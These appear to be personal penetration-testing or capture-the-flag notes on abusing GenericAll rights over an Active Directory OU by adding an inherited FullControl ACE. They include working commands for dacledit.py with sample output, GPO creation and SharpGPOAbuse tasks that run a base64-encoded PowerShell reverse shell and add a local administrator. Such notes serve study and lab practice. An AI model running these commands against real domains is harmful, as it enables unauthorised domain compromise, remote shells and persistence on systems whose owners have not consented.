`GenericAll` == `WriteDACL`
the attack vector based on the **GenericAll** rights of a user over an OU relies on the ACL inheritance mechanism in Active Directory. When adding an ACE to a parent object in a domain, it is possible to specify that such an ACE should not only apply to the object itself, but also to all descendant objects. 

As a result, a user having the **GenericAll** right (and thus **WriteDACL** permissions) over an OU could add a **FullControl** ACE to the OU and specify that this ACE should be inherited, **which will effectively lead to the compromise of all child objects since they will inherit said ACE**. As indicated by BloodHound, this can be performed through the **dacledit.py** tool on Linux (or **PowerView** on Windows).

**Main Idea**: If inheritance flag isn't set while we have`GenericAll` on OU, we will create anther `GenericAll` that has inheritance flag set on. 
```
OU=SERVERS (Your original GenericAll - no inheritance)
├── Computer=WEB01 ✗ (No access - inheritance blocked)
├── Computer=DB01  ✗ (No access - inheritance blocked)  
└── User=Admin     ✗ (No access - inheritance blocked)

OU=SERVERS (After dacledit.py with inheritance)
├── Computer=WEB01 ✓ (Now has access via inheritance)
├── Computer=DB01  ✓ (Now has access via inheritance)
└── User=Admin     ✓ (Now has access via inheritance)
```

---
## Commands
```powershell

New-GPO -Name "NewGPO" | New-GPLink -Target "OU=TargetOU,DC=FRIZZ,DC=HTB" -LinkEnabled YES

cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w0 --> {T} in bash.

.\SharpGPOAbuse.exe --Addcomputertask --GPOName "car" --Author "car" --TaskName "RevShell" --Command "reverse.exe" --Arguments "powershell enc {T}"
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "car" --force

gpupdate /force

```

```shell
$ dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'naugustine' -target-dn 'OU=SERVERS,DC=corp,DC=com' 'corp.com'/'naugustine':'Password1'
[...]
[*] DACL modified successfully!

$ dacledit.py -action 'read' -principal 'naugustine' -target-dn 'CN=AD01-SRV1,OU=SERVERS,DC=corp,DC=com' 'corp.com'/'naugustine':'Password1'
[...]
[*] Filtering results for SID (S-1-5-21-2015307081-2275635861-2347354195-1481)
[*]   ACE[20] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : naugustine (S-1-5-21-2015307081-2275635861-2347354195-1481)
```

